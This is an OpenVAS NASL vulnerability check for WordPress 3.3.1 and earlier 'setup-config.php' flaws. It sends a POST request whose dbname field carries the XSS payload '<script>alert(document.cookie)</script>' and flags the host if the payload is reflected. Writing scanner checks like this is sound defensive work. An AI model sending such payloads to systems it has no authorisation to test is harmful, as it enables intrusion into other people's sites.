###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_setup_config_mult_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# WordPress 'setup-config.php' Multiple Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802298");
  script_version("$Revision: 11374 $");
  script_cve_id("CVE-2011-4898", "CVE-2011-4899", "CVE-2012-0782");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-04-10 11:01:51 +0200 (Mo, 10 Apr 2017)$");
  script_tag(name:"creation_date", value:"2012-02-01 09:09:09 +0530 (Wed, 01 Feb 2012)");
  script_name("WordPress 'setup-config.php' Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18417");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Jan/416");
  script_xref(name:"URL", value:"https://www.trustwave.com/spiderlabs/advisories/TWSL2012-002.txt");
  script_xref(name:"URL", value:"http://wordpress.org/support/topic/wordpress-331-code-execution-cross-site-scripting");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to conduct PHP code
  execution and cross-site scripting attacks.");

  script_tag(name:"affected", value:"Wordpress versions 3.3.1 and prior");

  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of user-supplied input
  passed to the 'setup-config.php' installation page, which allows attackers to
  execute arbitrary HTML and PHP code in the context of an affected site.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running WordPress and is prone to multiple
  vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if(dir == "/") dir = "";
url = dir + "/wp-admin/setup-config.php?step=2";
postData = "dbname=<script>alert(document.cookie)</script>&uname=root&pwd=&dbhost=localhost&prefix=wp_&submit=Submit";

host = http_host_name(port:port);

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData), "\r\n",
             "\r\n", postData, "\r\n");
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 200" && '<script>alert(document.cookie)</script>' >< res){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);